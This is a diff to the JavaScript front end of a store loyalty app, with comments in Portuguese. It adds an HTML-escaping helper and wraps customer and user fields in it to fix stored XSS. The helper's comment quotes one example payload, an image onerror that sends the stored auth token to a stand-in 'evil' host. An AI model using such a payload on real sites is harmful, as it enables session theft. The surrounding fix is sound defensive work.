@@ -2,6 +2,22 @@
 const API = '/api/v1';
 const $ = (s, ctx = document) => ctx.querySelector(s);
 
+/**
+ * Escapa string para uso seguro em interpolação dentro de innerHTML.
+ * Use SEMPRE que renderizar dados vindos do servidor (nome, telefone,
+ * descrição) — caso contrário, um cliente cadastrado com nome
+ * `<img src=x onerror=fetch('//evil/'+localStorage.loja_token)>` rouba
+ * o token Sanctum quando o atendente abrir a busca.
+ */
+function esc(s) {
+    if (s === null || s === undefined) return '';
+    return String(s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    })[c]);
+}
+/** Atributo dentro de aspas duplas — atributos só precisam de escape de `"` `&` `<`, mas usamos esc() para uniformidade. */
+function escAttr(s) { return esc(s); }
+
 const STATE = {
     token: localStorage.getItem('loja_token') || null,
     user: JSON.parse(localStorage.getItem('loja_user') || 'null'),
@@ -151,14 +167,14 @@ function telaHome() {
         <div class="px-5 pt-8 pb-12 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
             <div class="flex items-center gap-3">
                 ${u.empresa?.logo
-                    ? `<img src="${u.empresa.logo}" class="w-12 h-12 rounded-xl bg-white/10 p-1 object-contain">`
+                    ? `<img src="${escAttr(u.empresa.logo)}" class="w-12 h-12 rounded-xl bg-white/10 p-1 object-contain">`
                     : `<div class="w-12 h-12 rounded-xl bg-white/20 flex items-center justify-center"><i class="ri-store-2-line text-2xl"></i></div>`}
                 <div>
                     <p class="text-white/70 text-xs uppercase tracking-wider">Loja</p>
-                    <h1 class="text-xl font-bold">${u.empresa?.nome || ''}</h1>
+                    <h1 class="text-xl font-bold">${esc(u.empresa?.nome || '')}</h1>
                 </div>
             </div>
-            <p class="text-white/80 text-sm mt-4">Olá, ${u.nome.split(' ')[0]} 👋</p>
+            <p class="text-white/80 text-sm mt-4">Olá, ${esc(String(u.nome || '').split(' ')[0])} 👋</p>
             <p class="text-white/60 text-xs">Pronto para registrar a próxima venda?</p>
         </div>
 
@@ -376,13 +392,13 @@ function telaBusca() {
                     return;
                 }
                 results.innerHTML = r.clientes.map(c => `
-                    <button data-id="${c.id}" class="cliente-card w-full bg-white border border-slate-200 rounded-2xl p-3 flex items-center gap-3 hover:bg-slate-50 transition text-left">
-                        <div class="w-10 h-10 rounded-full text-white font-bold flex items-center justify-center overflow-hidden" style="background:${cor}">
-                            ${c.foto ? `<img src="${c.foto}" class="w-full h-full object-cover">` : c.nome.charAt(0).toUpperCase()}
+                    <button data-id="${Number(c.id)}" class="cliente-card w-full bg-white border border-slate-200 rounded-2xl p-3 flex items-center gap-3 hover:bg-slate-50 transition text-left">
+                        <div class="w-10 h-10 rounded-full text-white font-bold flex items-center justify-center overflow-hidden" style="background:${escAttr(cor)}">
+                            ${c.foto ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover">` : esc(String(c.nome || '').charAt(0).toUpperCase())}
                         </div>
                         <div class="flex-1 min-w-0">
-                            <p class="font-semibold text-slate-800 truncate">${c.nome}</p>
-                            <p class="text-xs text-slate-500 truncate">${c.telefone || ''}${c.cpf ? ' • ' + c.cpf : ''}</p>
+                            <p class="font-semibold text-slate-800 truncate">${esc(c.nome)}</p>
+                            <p class="text-xs text-slate-500 truncate">${esc(c.telefone || '')}${c.cpf ? ' • ' + esc(c.cpf) : ''}</p>
                         </div>
                         <div class="text-right text-xs">
                             <p class="text-slate-700 font-semibold">${fmtNum(c.pontos)} pts</p>
@@ -417,11 +433,11 @@ function telaVenda() {
             </button>
             <div class="flex items-center gap-3">
                 <div class="w-14 h-14 rounded-full bg-white/20 backdrop-blur border-2 border-white/30 flex items-center justify-center text-2xl font-bold overflow-hidden">
-                    ${c.foto ? `<img src="${c.foto}" class="w-full h-full object-cover">` : c.nome.charAt(0).toUpperCase()}
+                    ${c.foto ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover">` : esc(String(c.nome || '').charAt(0).toUpperCase())}
                 </div>
                 <div class="min-w-0 flex-1">
-                    <h1 class="text-lg font-bold truncate">${c.nome}</h1>
-                    <p class="text-white/80 text-xs truncate">${c.telefone || ''}</p>
+                    <h1 class="text-lg font-bold truncate">${esc(c.nome)}</h1>
+                    <p class="text-white/80 text-xs truncate">${esc(c.telefone || '')}</p>
                 </div>
             </div>
             <div class="grid grid-cols-3 gap-2 mt-5 bg-white/15 backdrop-blur rounded-2xl border border-white/20 p-3 text-center">
@@ -536,7 +552,7 @@ function telaSucesso() {
 
         ${r.cliente ? `
         <p class="text-xs text-slate-500 mt-4">
-            ${r.cliente.nome.split(' ')[0]} agora tem
+            ${esc(String(r.cliente.nome || '').split(' ')[0])} agora tem
             <strong class="text-slate-700">${fmtNum(r.cliente.pontos)} pts</strong>
             e <strong class="text-emerald-600">${fmtBRL(r.cliente.cashback)}</strong>.
         </p>` : ''}
@@ -628,16 +644,16 @@ function telaPerfil() {
     <div class="fade-in flex-1 flex flex-col bg-slate-50">
         <div class="px-5 pt-8 pb-12 text-white text-center" style="background:linear-gradient(135deg,${cor},${corSec})">
             <div class="w-24 h-24 mx-auto rounded-full bg-white/20 backdrop-blur border-4 border-white/30 flex items-center justify-center text-4xl font-bold shadow-lg">
-                ${u.nome.charAt(0).toUpperCase()}
+                ${esc(String(u.nome || '').charAt(0).toUpperCase())}
             </div>
-            <h1 class="text-2xl font-bold mt-4">${u.nome}</h1>
-            <p class="text-white/80 text-sm">${u.email}</p>
-            <p class="text-white/70 text-xs mt-1">${u.role || ''}</p>
+            <h1 class="text-2xl font-bold mt-4">${esc(u.nome)}</h1>
+            <p class="text-white/80 text-sm">${esc(u.email)}</p>
+            <p class="text-white/70 text-xs mt-1">${esc(u.role || '')}</p>
         </div>
         <div class="px-4 -mt-8">
             <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-4">
                 <p class="text-xs text-slate-500 uppercase tracking-wider">Loja</p>
-                <p class="font-semibold text-slate-800 mt-0.5">${u.empresa?.nome || '—'}</p>
+                <p class="font-semibold text-slate-800 mt-0.5">${esc(u.empresa?.nome || '—')}</p>
             </div>
         </div>
         <div class="px-4 mt-6 pb-6">
